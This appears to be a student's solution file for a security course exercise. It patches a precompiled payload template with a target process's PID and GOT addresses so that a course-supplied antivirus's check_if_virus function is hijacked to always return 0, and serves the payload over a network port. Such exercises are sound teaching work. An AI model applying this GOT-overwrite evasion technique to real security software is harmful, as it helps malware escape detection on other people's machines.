import addresses
import evasion

# unusual value to overide with run time pid of the antivirus
UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678
# unusual value to memory address of the check_if_value
# to overide with the run time address
UNUSUAL_GOT_MEMORY_ADDRESS_FOR_BIN_PATCH = 0x56565656
# unusual value to memory address of the check_if_live_patch
# to overide with the run time address
UNUSUAL_MEMORY_ADDRESS_FOR_ALTERNATIVE_FUNCTION = 0x10283746


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        # change into little endian
        addr_check_if_virus = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE)
        pid_in_bytes = addresses.address_to_bytes(pid)
        got_memory_addr = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT) 
        alternative_func_addr_in_bytes = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)
        # do the binary patching of the globals
        with open(PATH_TO_TEMPLATE, "r+b") as read_writer:
            general_payload = read_writer.read()

        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_GOT_MEMORY_ADDRESS_FOR_BIN_PATCH), got_memory_addr)

        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_PID_VALUE_FOR_BIN_PATCH), pid_in_bytes)
        
        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_MEMORY_ADDRESS_FOR_ALTERNATIVE_FUNCTION), alternative_func_addr_in_bytes)
        
        payload = general_payload
        return payload

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
